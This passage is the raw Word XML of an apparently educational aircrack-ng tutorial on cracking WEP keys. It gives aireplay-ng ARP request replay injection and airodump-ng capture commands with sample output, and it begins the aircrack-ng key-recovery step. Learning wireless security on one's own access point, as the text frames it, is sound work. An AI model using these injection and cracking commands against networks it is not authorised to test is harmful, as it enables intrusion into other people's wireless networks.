        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D98F3CE" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="00826FDB" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00826FDB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 - Send keep alive packets every 10 seconds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B181B0" w14:textId="77777777" w:rsidR="00826FDB" w:rsidRDefault="00826FDB" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="494D7F2E" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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 xml:space="preserve">Notice the “Got a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet” and the continuous retries above. Do not proceed to the next step until you have the fake authentication running correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5099D921" w14:textId="77777777" w:rsidR="0056768E" w:rsidRDefault="0056768E" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E5B0D3" w14:textId="775BD723" w:rsidR="002B7D39" w:rsidRDefault="00C94A94" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 4</w:t>
      </w:r>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> in ARP request replay mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF346AE" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Open another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F17962A" w14:textId="77777777" w:rsidR="00C829EF" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EB6159" w14:textId="26E8AA11" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1576CC98" w14:textId="77777777" w:rsidR="002B5D62" w:rsidRDefault="002B5D62" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="434EDA82" w14:textId="338DD27F" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">You should also start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture replies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D11B31" w14:textId="77777777" w:rsidR="00E21822" w:rsidRDefault="00E21822" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E65E108" w14:textId="77777777" w:rsidR="002B5D62" w:rsidRPr="008E353E" w:rsidRDefault="002B5D62" w:rsidP="002B5D62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</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-c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458F881F" w14:textId="77777777" w:rsidR="002B5D62" w:rsidRDefault="002B5D62" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B0D1B78" w14:textId="6CA0FEB0" w:rsidR="00E21822" w:rsidRDefault="00E21822" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4321978D" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Read 629399 packets (got 316283 ARP requests), sent 210955 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABFCC65" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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 xml:space="preserve">You can confirm that you are injecting by checking your </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> screen. </w:t>
      </w:r>
      <w:r w:rsidRPr="00381064">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The data packets should be increasing rapidly.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> The ”#/s” should be a decent number. However, decent depends on a large variety of factors. A typical </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>range</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>300 to 400 data packets per second</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. It can as low as a 100/second and as high as a 500/second.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247815F3" w14:textId="77777777" w:rsidR="00C829EF" w:rsidRDefault="00C829EF" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20E75FA1" w14:textId="01A0F547" w:rsidR="002B7D39" w:rsidRDefault="00590FC4" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 5</w:t>
      </w:r>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674C650C" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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The purpose of this step is to obtain the WEP key from the IVs gathered in the previous steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CD7B16" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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 xml:space="preserve">Note: For learning purposes, you should use a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>64 bit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> WEP key on your AP to speed up the cracking process. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>If this is the case, then you can include ”-n 64” to limit the checking of keys to 64 bits.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5B96140D" w14:textId="77777777" w:rsidR="00EE3BA5" w:rsidRDefault="00EE3BA5" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DF7F340" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Two methods will be shown. It is recommended you try both for learning purposes. By trying both methods, you will see quickly the PTW method successfully determines the WEP key compared to the FMS/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Korek</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> method. As a reminder, the PTW method only works successfully with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> request/reply packets. Since this tutorial covers injection of ARP request packets, you can properly use this method. The other requirement is that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">you capture the full packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Meaning, do not use the ”--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ivs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3BCC9F" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Start another console session and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278C174F" w14:textId="77777777" w:rsidR="00EE3BA5" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
